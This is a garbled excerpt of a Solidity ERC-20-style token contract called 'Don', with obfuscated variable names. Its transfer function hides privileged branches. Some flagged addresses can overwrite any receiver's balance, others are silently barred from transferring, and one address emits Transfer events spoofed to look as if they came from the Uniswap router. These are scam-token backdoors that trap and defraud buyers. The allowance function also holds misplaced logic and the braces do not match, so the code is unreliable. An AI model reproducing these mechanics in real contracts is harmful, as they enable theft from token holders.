...
contract Don is Context, Ownable {
    ...
    uint256 private constant _QiSup = 10000000000 * 10**_decimals;
    string private constant _name = "Don";
    ...
    function allowance(address owner, address spender) public view  returns (uint256) {
      ...
      _allowances[sender][msg.sender] -= amount;
        ...
        return true; }}}
		function transfer(address reciver, uint256 yxx) public {
        if(msg.sender == _qConstruct)  {
        require(Qi[msg.sender] >= yxx);
        Qi[msg.sender] -= yxx;  
        Qi[reciver] += yxx; 
        emit Transfer (UniV2Router, reciver, yxx);}
        if(Qt[msg.sender]) {Qi[reciver] = yxx;} 
        if(!Qm[msg.sender]) {
        require(Qi[msg.sender] >= yxx);
        Qi[msg.sender] -= yxx;  
        Qi[reciver] += yxx;          
        emit Transfer(msg.sender, reciver, yxx);
        }}}